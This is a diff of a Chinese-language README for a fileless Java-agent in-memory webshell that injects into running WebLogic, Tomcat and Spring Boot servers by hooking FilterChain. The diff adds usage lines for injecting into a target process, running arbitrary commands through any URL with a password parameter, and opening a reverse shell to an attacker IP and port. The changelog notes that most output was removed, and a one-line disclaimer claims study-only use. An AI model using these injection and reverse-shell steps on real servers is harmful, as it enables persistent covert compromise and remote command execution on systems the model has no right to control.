@@ -1,10 +1,11 @@
 # 说明
-大部分的代码和思路沿用`rebeyond`。`rebeyond`采用的是javassist修改字节码，本项目采用asm修改字节码。github地址：https://github.com/rebeyond/memShell.
-本memshell适用于weblogic及tomcat。
+一个基于`javaagent`+`ASM`的无文件落地的javaagent，兼容多种容器(weblogic,Tomcat,Springboot).
 
-# jdk要求
-* Jdk 1.5-1.8
-* openJDK
+# inject jdk要求
+* Java 8
+
+# agent jdk要求
+* Java 6-11
 
 # 兼容版本
 * weblogic 10.3.6
@@ -12,24 +13,28 @@
 * weblogic 12.2.1.3
 * weblogic 12.1.3.0
 * Tomcat 8.5.61
->其他容器及其版本暂未测试
+* Spring boot
 
 # 测试平台
 * macos 10.0+
 * centos 7.1
 * windows 10
->其他操作系统暂未测试
-
-# 更新
-## 2021/06/19
-* 修改hook点为`javax/servlet/FilterChain`，使其同时兼容tomcat.
-* weblogic注入内存马，现在访问任意url，带上密码和命令即可
+* windows 11
 
 # 使用说明
-1. 克隆本项目。
-2. 运行mvn clean package
-3. 将生成jar包统一放入待攻击的服务器中，运行`java -jar inject.jar [your_password]`，即可注入。
-4. 访问任意url，带上参数`psw=your_password&cmd=your_cmd`,即可执行命令。
+## inject 参数
+```shell
+java -jar inject.jar [your_password]  # 通用运行
+java -jar inject.jar -p               # 打印所有运行的java进程名
+java -jar inject.jar [your_password] [process_name] # 定向注入到[process_name]
+```
+## 请求参数
+
+```text
+任意url?psw =[your_password]&cmd=[your_cmd]  执行任意命令
+任意url?psw =[your_password]&ip=[attack_ip]&port=[attack_port] 反弹shell
+```
+
 # 测试案例
 运行`java -jar inject-1.0.jar x1001`
 ![java](./img/java.png)
@@ -49,6 +54,20 @@
 >* 用户输入Ctrl+C（√）
 >* 遇到问题异常退出（√）
 >* kill -9 杀掉进程（×）
+
+# 更新
+## 2021/06/19
+* 修改hook点为`javax/servlet/FilterChain`，使其同时兼容tomcat.
+* weblogic注入内存马，现在访问任意url，带上密码和命令即可
+
+## 2021/12/02
+* 简化hook流程
+* 去除大部分打印
+* inject.jar增加自定义hook的进程
+* 增加反弹shell
+
+# 参考
+https://github.com/rebeyond/memShell
 
 # 声明
 本项目仅供学习使用，勿做它用
